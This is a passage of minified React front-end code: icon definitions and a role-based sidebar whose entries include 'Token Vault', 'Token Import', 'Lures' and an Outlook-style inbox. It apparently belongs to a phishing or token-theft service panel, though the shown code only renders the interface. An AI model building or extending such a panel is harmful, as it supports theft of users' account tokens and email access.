        d: `M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143`,
        key: `13bj9a`,
      },
    ],
    [`path`, { d: `m2 2 20 20`, key: `1ooewy` }],
  ]),
  Jr = F(`eye`, [
    [
      `path`,
      {
        d: `M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0`,
        key: `1nclc0`,
      },
    ],
    [`circle`, { cx: `12`, cy: `12`, r: `3`, key: `1v7zrd` }],
  ]),
  Yr = F(`file-braces`, [
    [
      `path`,
      {
        d: `M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z`,
        key: `1oefj6`,
      },
    ],
    [`path`, { d: `M14 2v5a1 1 0 0 0 1 1h5`, key: `wfsgrz` }],
    [
      `path`,
      {
        d: `M10 12a1 1 0 0 0-1 1v1a1 1 0 0 1-1 1 1 1 0 0 1 1 1v1a1 1 0 0 0 1 1`,
        key: `1oajmo`,
      },
    ],
    [
      `path`,
      {
        d: `M14 18a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1 1 1 0 0 1-1-1v-1a1 1 0 0 0-1-1`,
        key: `mpwhp6`,
      },
    ],
  ]),
  Xr = F(`file-down`, [
    [
      `path`,
      {
        d: `M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z`,
        key: `1oefj6`,
      },
    ],
    [`path`, { d: `M14 2v5a1 1 0 0 0 1 1h5`, key: `wfsgrz` }],
    [`path`, { d: `M12 18v-6`, key: `17g6i2` }],
    [`path`, { d: `m9 15 3 3 3-3`, key: `1npd3o` }],
  ]),
  Zr = F(`file-text`, [
    [
      `path`,
      {
        d: `M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z`,
        key: `1oefj6`,
      },
    ],
    [`path`, { d: `M14 2v5a1 1 0 0 0 1 1h5`, key: `wfsgrz` }],
    [`path`, { d: `M10 9H8`, key: `b1mrlr` }],
    [`path`, { d: `M16 13H8`, key: `t4e002` }],
    [`path`, { d: `M16 17H8`, key: `z1uh3a` }],
  ]),
  Qr = F(`gift`, [
    [`path`, { d: `M12 7v14`, key: `1akyts` }],
    [`path`, { d: `M20 11v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-8`, key: `1sqzm4` }],
    [
      `path`,
      {
        d: `M7.5 7a1 1 0 0 1 0-5A4.8 8 0 0 1 12 7a4.8 8 0 0 1 4.5-5 1 1 0 0 1 0 5`,
        key: `kc0143`,
      },
    ],
    [
      `rect`,
      { x: `3`, y: `7`, width: `18`, height: `4`, rx: `1`, key: `1hberx` },
    ],
  ]),
  $r = F(`globe`, [
    [`circle`, { cx: `12`, cy: `12`, r: `10`, key: `1mglay` }],
    [
      `path`,
      { d: `M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20`, key: `13o1zl` },
    ],
    [`path`, { d: `M2 12h20`, key: `9i4pu4` }],
  ]),
  ei = F(`graduation-cap`, [
    [
      `path`,
      {
        d: `M21.42 10.922a1 1 0 0 0-.019-1.838L12.83 5.18a2 2 0 0 0-1.66 0L2.6 9.08a1 1 0 0 0 0 1.832l8.57 3.908a2 2 0 0 0 1.66 0z`,
        key: `j76jl0`,
      },
    ],
    [`path`, { d: `M22 10v6`, key: `1lu8f3` }],
    [`path`, { d: `M6 12.5V16a6 3 0 0 0 12 0v-3.5`, key: `1r8lef` }],
  ]),
  ti = F(`key-round`, [
    [
      `path`,
      {
        d: `M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z`,
        key: `1s6t7t`,
      },
    ],
    [
      `circle`,
      { cx: `16.5`, cy: `7.5`, r: `.5`, fill: `currentColor`, key: `w0ekpg` },
    ],
  ]),
  ni = F(`key`, [
    [
      `path`,
      {
        d: `m15.5 7.5 2.3 2.3a1 1 0 0 0 1.4 0l2.1-2.1a1 1 0 0 0 0-1.4L19 4`,
        key: `g0fldk`,
      },
    ],
    [`path`, { d: `m21 2-9.6 9.6`, key: `1j0ho8` }],
    [`circle`, { cx: `7.5`, cy: `15.5`, r: `5.5`, key: `yqb3hr` }],
  ]),
  ri = F(`layers`, [
    [
      `path`,
      {
        d: `M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z`,
        key: `zw3jo`,
      },
    ],
    [
      `path`,
      {
        d: `M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12`,
        key: `1wduqc`,
      },
    ],
    [
      `path`,
      {
        d: `M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17`,
        key: `kqbvx6`,
      },
    ],
  ]),
  ii = F(`layout-dashboard`, [
    [
      `rect`,
      { width: `7`, height: `9`, x: `3`, y: `3`, rx: `1`, key: `10lvy0` },
    ],
    [
      `rect`,
      { width: `7`, height: `5`, x: `14`, y: `3`, rx: `1`, key: `16une8` },
    ],
    [
      `rect`,
      { width: `7`, height: `9`, x: `14`, y: `12`, rx: `1`, key: `1hutg5` },
    ],
    [
      `rect`,
      { width: `7`, height: `5`, x: `3`, y: `16`, rx: `1`, key: `ldoo1y` },
    ],
  ]),
  ai = F(`link-2`, [
    [`path`, { d: `M9 17H7A5 5 0 0 1 7 7h2`, key: `8i5ue5` }],
    [`path`, { d: `M15 7h2a5 5 0 1 1 0 10h-2`, key: `1b9ql8` }],
    [`line`, { x1: `8`, x2: `16`, y1: `12`, y2: `12`, key: `1jonct` }],
  ]),
  oi = F(`link`, [
    [
      `path`,
      {
        d: `M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71`,
        key: `1cjeqo`,
      },
    ],
    [
      `path`,
      {
        d: `M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71`,
        key: `19qd67`,
      },
    ],
  ]),
  si = F(`loader-circle`, [
    [`path`, { d: `M21 12a9 9 0 1 1-6.219-8.56`, key: `13zald` }],
  ]),
  ci = F(`loader`, [
    [`path`, { d: `M12 2v4`, key: `3427ic` }],
    [`path`, { d: `m16.2 7.8 2.9-2.9`, key: `r700ao` }],
    [`path`, { d: `M18 12h4`, key: `wj9ykh` }],
    [`path`, { d: `m16.2 16.2 2.9 2.9`, key: `1bxg5t` }],
    [`path`, { d: `M12 18v4`, key: `jadmvz` }],
    [`path`, { d: `m4.9 19.1 2.9-2.9`, key: `bwix9q` }],
    [`path`, { d: `M2 12h4`, key: `j09sii` }],
    [`path`, { d: `m4.9 4.9 2.9 2.9`, key: `giyufr` }],
  ]),
  li = F(`lock`, [
    [
      `rect`,
      {
        width: `18`,
        height: `11`,
        x: `3`,
        y: `11`,
        rx: `2`,
        ry: `2`,
        key: `1w4ew1`,
      },
    ],
    [`path`, { d: `M7 11V7a5 5 0 0 1 10 0v4`, key: `fwvmzm` }],
  ]),
  ui = F(`log-out`, [
    [`path`, { d: `m16 17 5-5-5-5`, key: `1bji2h` }],
    [`path`, { d: `M21 12H9`, key: `dn1m92` }],
    [`path`, { d: `M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4`, key: `1uf3rs` }],
  ]),
  di = F(`mail`, [
    [`path`, { d: `m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7`, key: `132q7q` }],
    [
      `rect`,
      { x: `2`, y: `4`, width: `20`, height: `16`, rx: `2`, key: `izxlao` },
    ],
  ]),
  fi = F(`monitor`, [
    [
      `rect`,
      { width: `20`, height: `14`, x: `2`, y: `3`, rx: `2`, key: `48i651` },
    ],
    [`line`, { x1: `8`, x2: `16`, y1: `21`, y2: `21`, key: `1svkeh` }],
    [`line`, { x1: `12`, x2: `12`, y1: `17`, y2: `21`, key: `vw1qmm` }],
  ]),
  pi = F(`moon`, [
    [
      `path`,
      {
        d: `M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401`,
        key: `kfwtm`,
      },
    ],
  ]),
  mi = F(`paperclip`, [
    [
      `path`,
      {
        d: `m16 6-8.414 8.586a2 2 0 0 0 2.829 2.829l8.414-8.586a4 4 0 1 0-5.657-5.657l-8.379 8.551a6 6 0 1 0 8.485 8.485l8.379-8.551`,
        key: `1miecu`,
      },
    ],
  ]),
  hi = F(`pause`, [
    [
      `rect`,
      { x: `14`, y: `3`, width: `5`, height: `18`, rx: `1`, key: `kaeet6` },
    ],
    [
      `rect`,
      { x: `5`, y: `3`, width: `5`, height: `18`, rx: `1`, key: `1wsw3u` },
    ],
  ]),
  gi = F(`play`, [
    [
      `path`,
      {
        d: `M5 5a2 2 0 0 1 3.008-1.728l11.997 6.998a2 2 0 0 1 .003 3.458l-12 7A2 2 0 0 1 5 19z`,
        key: `10ikf1`,
      },
    ],
  ]),
  _i = F(`plus`, [
    [`path`, { d: `M5 12h14`, key: `1ays0h` }],
    [`path`, { d: `M12 5v14`, key: `s699le` }],
  ]),
  vi = F(`qr-code`, [
    [
      `rect`,
      { width: `5`, height: `5`, x: `3`, y: `3`, rx: `1`, key: `1tu5fj` },
    ],
    [
      `rect`,
      { width: `5`, height: `5`, x: `16`, y: `3`, rx: `1`, key: `1v8r4q` },
    ],
    [
      `rect`,
      { width: `5`, height: `5`, x: `3`, y: `16`, rx: `1`, key: `1x03jg` },
    ],
    [`path`, { d: `M21 16h-3a2 2 0 0 0-2 2v3`, key: `177gqh` }],
    [`path`, { d: `M21 21v.01`, key: `ents32` }],
    [`path`, { d: `M12 7v3a2 2 0 0 1-2 2H7`, key: `8crl2c` }],
    [`path`, { d: `M3 12h.01`, key: `nlz23k` }],
    [`path`, { d: `M12 3h.01`, key: `n36tog` }],
    [`path`, { d: `M12 16v.01`, key: `133mhm` }],
    [`path`, { d: `M16 12h1`, key: `1slzba` }],
    [`path`, { d: `M21 12v.01`, key: `1lwtk9` }],
    [`path`, { d: `M12 21v-1`, key: `1880an` }],
  ]),
  yi = F(`refresh-cw`, [
    [
      `path`,
      {
        d: `M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8`,
        key: `v9h5vc`,
      },
    ],
    [`path`, { d: `M21 3v5h-5`, key: `1q7to0` }],
    [
      `path`,
      {
        d: `M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16`,
        key: `3uifl3`,
      },
    ],
    [`path`, { d: `M8 16H3v5`, key: `1cv678` }],
  ]),
  bi = F(`scan`, [
    [`path`, { d: `M3 7V5a2 2 0 0 1 2-2h2`, key: `aa7l1z` }],
    [`path`, { d: `M17 3h2a2 2 0 0 1 2 2v2`, key: `4qcy5o` }],
    [`path`, { d: `M21 17v2a2 2 0 0 1-2 2h-2`, key: `6vwrx8` }],
    [`path`, { d: `M7 21H5a2 2 0 0 1-2-2v-2`, key: `ioqczr` }],
  ]),
  xi = F(`search`, [
    [`path`, { d: `m21 21-4.34-4.34`, key: `14j7rj` }],
    [`circle`, { cx: `11`, cy: `11`, r: `8`, key: `4ej97u` }],
  ]),
  Si = F(`send`, [
    [
      `path`,
      {
        d: `M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z`,
        key: `1ffxy3`,
      },
    ],
    [`path`, { d: `m21.854 2.147-10.94 10.939`, key: `12cjpa` }],
  ]),
  Ci = F(`settings`, [
    [
      `path`,
      {
        d: `M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915`,
        key: `1i5ecw`,
      },
    ],
    [`circle`, { cx: `12`, cy: `12`, r: `3`, key: `1v7zrd` }],
  ]),
  wi = F(`share-2`, [
    [`circle`, { cx: `18`, cy: `5`, r: `3`, key: `gq8acd` }],
    [`circle`, { cx: `6`, cy: `12`, r: `3`, key: `w7nqdw` }],
    [`circle`, { cx: `18`, cy: `19`, r: `3`, key: `1xt0gg` }],
    [
      `line`,
      { x1: `8.59`, x2: `15.42`, y1: `13.51`, y2: `17.49`, key: `47mynk` },
    ],
    [
      `line`,
      { x1: `15.41`, x2: `8.59`, y1: `6.51`, y2: `10.49`, key: `1n3mei` },
    ],
  ]),
  Ti = F(`shield-alert`, [
    [
      `path`,
      {
        d: `M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z`,
        key: `oel41y`,
      },
    ],
    [`path`, { d: `M12 8v4`, key: `1got3b` }],
    [`path`, { d: `M12 16h.01`, key: `1drbdi` }],
  ]),
  Ei = F(`shield-check`, [
    [
      `path`,
      {
        d: `M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z`,
        key: `oel41y`,
      },
    ],
    [`path`, { d: `m9 12 2 2 4-4`, key: `dzmm74` }],
  ]),
  Di = F(`shield-off`, [
    [`path`, { d: `m2 2 20 20`, key: `1ooewy` }],
    [
      `path`,
      {
        d: `M5 5a1 1 0 0 0-1 1v7c0 5 3.5 7.5 7.67 8.94a1 1 0 0 0 .67.01c2.35-.82 4.48-1.97 5.9-3.71`,
        key: `1jlk70`,
      },
    ],
    [
      `path`,
      {
        d: `M9.309 3.652A12.252 12.252 0 0 0 11.24 2.28a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1v7a9.784 9.784 0 0 1-.08 1.264`,
        key: `18rp1v`,
      },
    ],
  ]),
  Oi = F(`shield`, [
    [
      `path`,
      {
        d: `M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z`,
        key: `oel41y`,
      },
    ],
  ]),
  ki = F(`shopping-cart`, [
    [`circle`, { cx: `8`, cy: `21`, r: `1`, key: `jimo8o` }],
    [`circle`, { cx: `19`, cy: `21`, r: `1`, key: `13723u` }],
    [
      `path`,
      {
        d: `M2.05 2.05h2l2.66 12.42a2 2 0 0 0 2 1.58h9.78a2 2 0 0 0 1.95-1.57l1.65-7.43H5.12`,
        key: `9zh506`,
      },
    ],
  ]),
  Ai = F(`sparkles`, [
    [
      `path`,
      {
        d: `M11.017 2.814a1 1 0 0 1 1.966 0l1.051 5.558a2 2 0 0 0 1.594 1.594l5.558 1.051a1 1 0 0 1 0 1.966l-5.558 1.051a2 2 0 0 0-1.594 1.594l-1.051 5.558a1 1 0 0 1-1.966 0l-1.051-5.558a2 2 0 0 0-1.594-1.594l-5.558-1.051a1 1 0 0 1 0-1.966l5.558-1.051a2 2 0 0 0 1.594-1.594z`,
        key: `1s2grr`,
      },
    ],
    [`path`, { d: `M20 2v4`, key: `1rf3ol` }],
    [`path`, { d: `M22 4h-4`, key: `gwowj6` }],
    [`circle`, { cx: `4`, cy: `20`, r: `2`, key: `6kqj1y` }],
  ]),
  ji = F(`square`, [
    [
      `rect`,
      { width: `18`, height: `18`, x: `3`, y: `3`, rx: `2`, key: `afitv7` },
    ],
  ]),
  Mi = F(`star`, [
    [
      `path`,
      {
        d: `M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z`,
        key: `r04s7s`,
      },
    ],
  ]),
  Ni = F(`sun`, [
    [`circle`, { cx: `12`, cy: `12`, r: `4`, key: `4exip2` }],
    [`path`, { d: `M12 2v2`, key: `tus03m` }],
    [`path`, { d: `M12 20v2`, key: `1lh1kg` }],
    [`path`, { d: `m4.93 4.93 1.41 1.41`, key: `149t6j` }],
    [`path`, { d: `m17.66 17.66 1.41 1.41`, key: `ptbguv` }],
    [`path`, { d: `M2 12h2`, key: `1t8f8n` }],
    [`path`, { d: `M20 12h2`, key: `1q8mjw` }],
    [`path`, { d: `m6.34 17.66-1.41 1.41`, key: `1m8zz5` }],
    [`path`, { d: `m19.07 4.93-1.41 1.41`, key: `1shlcs` }],
  ]),
  Pi = F(`target`, [
    [`circle`, { cx: `12`, cy: `12`, r: `10`, key: `1mglay` }],
    [`circle`, { cx: `12`, cy: `12`, r: `6`, key: `1vlfrh` }],
    [`circle`, { cx: `12`, cy: `12`, r: `2`, key: `1c9p78` }],
  ]),
  Fi = F(`toggle-left`, [
    [`circle`, { cx: `9`, cy: `12`, r: `3`, key: `u3jwor` }],
    [
      `rect`,
      { width: `20`, height: `14`, x: `2`, y: `5`, rx: `7`, key: `g7kal2` },
    ],
  ]),
  Ii = F(`toggle-right`, [
    [`circle`, { cx: `15`, cy: `12`, r: `3`, key: `1afu0r` }],
    [
      `rect`,
      { width: `20`, height: `14`, x: `2`, y: `5`, rx: `7`, key: `g7kal2` },
    ],
  ]),
  I = F(`trash-2`, [
    [`path`, { d: `M10 11v6`, key: `nco0om` }],
    [`path`, { d: `M14 11v6`, key: `outv1u` }],
    [`path`, { d: `M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6`, key: `miytrc` }],
    [`path`, { d: `M3 6h18`, key: `d0wm0j` }],
    [`path`, { d: `M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2`, key: `e791ji` }],
  ]),
  L = F(`triangle-alert`, [
    [
      `path`,
      {
        d: `m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3`,
        key: `wmoenq`,
      },
    ],
    [`path`, { d: `M12 9v4`, key: `juzpu7` }],
    [`path`, { d: `M12 17h.01`, key: `p32p05` }],
  ]),
  Li = F(`upload`, [
    [`path`, { d: `M12 3v12`, key: `1x0j5s` }],
    [`path`, { d: `m17 8-5-5-5 5`, key: `7q97r8` }],
    [`path`, { d: `M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4`, key: `ih7n3h` }],
  ]),
  Ri = F(`user-check`, [
    [`path`, { d: `m16 11 2 2 4-4`, key: `9rsbq5` }],
    [`path`, { d: `M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2`, key: `1yyitq` }],
    [`circle`, { cx: `9`, cy: `7`, r: `4`, key: `nufk8` }],
  ]),
  zi = F(`user-cog`, [
    [`path`, { d: `M10 15H6a4 4 0 0 0-4 4v2`, key: `1nfge6` }],
    [`path`, { d: `m14.305 16.53.923-.382`, key: `1itpsq` }],
    [`path`, { d: `m15.228 13.852-.923-.383`, key: `eplpkm` }],
    [`path`, { d: `m16.852 12.228-.383-.923`, key: `13v3q0` }],
    [`path`, { d: `m16.852 17.772-.383.924`, key: `1i8mnm` }],
    [`path`, { d: `m19.148 12.228.383-.923`, key: `1q8j1v` }],
    [`path`, { d: `m19.53 18.696-.382-.924`, key: `vk1qj3` }],
    [`path`, { d: `m20.772 13.852.924-.383`, key: `n880s0` }],
    [`path`, { d: `m20.772 16.148.924.383`, key: `1g6xey` }],
    [`circle`, { cx: `18`, cy: `15`, r: `3`, key: `gjjjvw` }],
    [`circle`, { cx: `9`, cy: `7`, r: `4`, key: `nufk8` }],
  ]),
  Bi = F(`user-search`, [
    [`circle`, { cx: `10`, cy: `7`, r: `4`, key: `e45bow` }],
    [`path`, { d: `M10.3 15H7a4 4 0 0 0-4 4v2`, key: `3bnktk` }],
    [`circle`, { cx: `17`, cy: `17`, r: `3`, key: `18b49y` }],
    [`path`, { d: `m21 21-1.9-1.9`, key: `1g2n9r` }],
  ]),
  Vi = F(`user-x`, [
    [`path`, { d: `M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2`, key: `1yyitq` }],
    [`circle`, { cx: `9`, cy: `7`, r: `4`, key: `nufk8` }],
    [`line`, { x1: `17`, x2: `22`, y1: `8`, y2: `13`, key: `3nzzx3` }],
    [`line`, { x1: `22`, x2: `17`, y1: `8`, y2: `13`, key: `1swrse` }],
  ]),
  Hi = F(`user`, [
    [`path`, { d: `M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2`, key: `975kel` }],
    [`circle`, { cx: `12`, cy: `7`, r: `4`, key: `17ys0d` }],
  ]),
  Ui = F(`users`, [
    [`path`, { d: `M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2`, key: `1yyitq` }],
    [`path`, { d: `M16 3.128a4 4 0 0 1 0 7.744`, key: `16gr8j` }],
    [`path`, { d: `M22 21v-2a4 4 0 0 0-3-3.87`, key: `kshegd` }],
    [`circle`, { cx: `9`, cy: `7`, r: `4`, key: `nufk8` }],
  ]),
  Wi = F(`video`, [
    [
      `path`,
      {
        d: `m16 13 5.223 3.482a.5.5 0 0 0 .777-.416V7.87a.5.5 0 0 0-.752-.432L16 10.5`,
        key: `ftymec`,
      },
    ],
    [
      `rect`,
      { x: `2`, y: `6`, width: `14`, height: `12`, rx: `2`, key: `158x01` },
    ],
  ]),
  Gi = F(`wallet`, [
    [
      `path`,
      {
        d: `M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1`,
        key: `18etb6`,
      },
    ],
    [`path`, { d: `M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4`, key: `xoc0q4` }],
  ]),
  Ki = F(`x`, [
    [`path`, { d: `M18 6 6 18`, key: `1bl5f8` }],
    [`path`, { d: `m6 6 12 12`, key: `d8bk6v` }],
  ]),
  qi = F(`zap`, [
    [
      `path`,
      {
        d: `M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z`,
        key: `1xq2db`,
      },
    ],
  ]),
  Ji = o((e) => {
    var t = Symbol.for(`react.transitional.element`),
      n = Symbol.for(`react.fragment`);
    function r(e, n, r) {
      var i = null;
      if (
        (r !== void 0 && (i = `` + r),
        n.key !== void 0 && (i = `` + n.key),
        `key` in n)
      )
        for (var a in ((r = {}), n)) a !== `key` && (r[a] = n[a]);
      else r = n;
      return (
        (n = r.ref),
        { $$typeof: t, type: e, key: i, ref: n === void 0 ? null : n, props: r }
      );
    }
    ((e.Fragment = n), (e.jsx = r), (e.jsxs = r));
  }),
  R = o((e, t) => {
    t.exports = Ji();
  })();
function Yi({ to: e, icon: t, label: n }) {
  return (0, R.jsxs)(jn, {
    to: e,
    className: ({ isActive: e }) =>
      `flex items-center gap-3 px-4 py-[7px] text-[13px] border-l-2 transition-all duration-100 ${e ? `border-accent text-text font-semibold bg-accent/10` : `border-transparent text-text-secondary hover:text-text hover:bg-accent/5 font-normal`}`,
    children: [t, (0, R.jsx)(`span`, { children: n })],
  });
}
function Xi({ label: e }) {
  return (0, R.jsx)(`div`, {
    className: `px-4 pt-5 pb-1.5 text-[10px] text-text-muted uppercase tracking-[0.2em] font-bold select-none`,
    children: e,
  });
}
function Zi() {
  let e = er((e) => e.user),
    t = er((e) => e.logout),
    n = e?.role,
    r = rr((e) => e.branding),
    { theme: i, toggle: a } = pr(),
    o = r.panel_name || `PANEL`;
  return (0, R.jsxs)(`aside`, {
    className: `w-[200px] bg-sidebar border-r border-border h-screen flex flex-col fixed left-0 top-0 z-10`,
    children: [
      (0, R.jsx)(`div`, {
        className: `px-4 py-4 border-b border-border`,
        children: r.panel_logo
          ? (0, R.jsx)(`img`, {
              src: r.panel_logo,
              alt: o,
              className: `h-6 max-w-[160px] object-contain`,
            })
          : (0, R.jsx)(`div`, {
              className: `text-base font-extrabold tracking-[0.35em] text-text`,
              children: o,
            }),
      }),
      (0, R.jsxs)(`div`, {
        className: `px-4 py-2.5 border-b border-border`,
        children: [
          (0, R.jsx)(`div`, {
            className: `text-[11px] text-text font-medium truncate`,
            children: e?.username ?? `...`,
          }),
          (0, R.jsxs)(`div`, {
            className: `text-[10px] text-text-muted tracking-wider uppercase mt-0.5`,
            children: [
              n ?? `...`,
              e?.is_pro &&
                (0, R.jsx)(`span`, {
                  className: `ml-1.5 bg-white text-black px-1.5 py-px text-[8px] font-extrabold tracking-wider align-middle`,
                  children: `PRO`,
                }),
            ],
          }),
        ],
      }),
      (0, R.jsxs)(`nav`, {
        className: `flex-1 overflow-y-auto py-1`,
        children: [
          n === `admin` &&
            (0, R.jsxs)(R.Fragment, {
              children: [
                (0, R.jsx)(Xi, { label: `Admin` }),
                (0, R.jsx)(Yi, {
                  to: `/admin`,
                  icon: (0, R.jsx)(ii, {
                    size: 15,
                    className: `text-[#60a5fa]`,
                  }),
                  label: `Dashboard`,
                }),
                (0, R.jsx)(Yi, {
                  to: `/admin/clients`,
                  icon: (0, R.jsx)(Ui, {
                    size: 15,
                    className: `text-[#a78bfa]`,
                  }),
                  label: `Clients`,
                }),
                (0, R.jsx)(Yi, {
                  to: `/admin/agents`,
                  icon: (0, R.jsx)(Bi, {
                    size: 15,
                    className: `text-[#2dd4bf]`,
                  }),
                  label: `Agents`,
                }),
              ],
            }),
          (n === `agent` || n === `admin`) &&
            (0, R.jsxs)(R.Fragment, {
              children: [
                (0, R.jsx)(Xi, { label: `Management` }),
                (0, R.jsx)(Yi, {
                  to: `/agent`,
                  icon: (0, R.jsx)(ii, {
                    size: 15,
                    className: `text-[#60a5fa]`,
                  }),
                  label: `Dashboard`,
                }),
                (0, R.jsx)(Yi, {
                  to: `/agent/clients`,
                  icon: (0, R.jsx)(Ui, {
                    size: 15,
                    className: `text-[#a78bfa]`,
                  }),
                  label: `Clients`,
                }),
              ],
            }),
          (0, R.jsx)(Xi, { label: `Main` }),
          (0, R.jsx)(Yi, {
            to: `/`,
            icon: (0, R.jsx)(ii, { size: 15, className: `text-[#60a5fa]` }),
            label: `Overview`,
          }),
          (0, R.jsx)(Yi, {
            to: `/tokens`,
            icon: (0, R.jsx)(ti, { size: 15, className: `text-[#fbbf24]` }),
            label: `Token Vault`,
          }),
          n === `admin` &&
            (0, R.jsx)(Yi, {
              to: `/import`,
              icon: (0, R.jsx)(Li, { size: 15, className: `text-[#fb923c]` }),
              label: `Token Import`,
            }),
          (0, R.jsx)(Yi, {
            to: `/lures`,
            icon: (0, R.jsx)(ai, { size: 15, className: `text-[#4ade80]` }),
            label: `Lures`,
          }),
          (0, R.jsx)(Xi, { label: `Email` }),
          (0, R.jsx)(Yi, {
            to: `/inbox`,
            icon: (0, R.jsxs)(`svg`, {
              width: `15`,
              height: `15`,
              viewBox: `0 0 32 32`,
              fill: `none`,
              children: [
                (0, R.jsx)(`path`, {
                  d: `M28.596 2H11.404A1.404 1.404 0 0 0 10 3.404V5l9.69 3.5L30 5V3.404A1.404 1.404 0 0 0 28.596 2Z`,
                  fill: `#0364B8`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M30 5H10v8l9.69 3.5L30 13V5Z`,
                  fill: `#0078D4`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M30 13H10v8l9.69 3.5L30 21v-8Z`,
                  fill: `#28A8EA`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M30 21H10v7.596A1.404 1.404 0 0 0 11.404 30h17.192A1.404 1.404 0 0 0 30 28.596V21Z`,
                  fill: `#0078D4`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M10 5v8H2V6.5A1.5 1.5 0 0 1 3.5 5H10Z`,
                  opacity: `.5`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M16.434 7H10v17h6.434A1.57 1.57 0 0 0 18 22.434V8.566A1.57 1.57 0 0 0 16.434 7Z`,
                  opacity: `.1`,
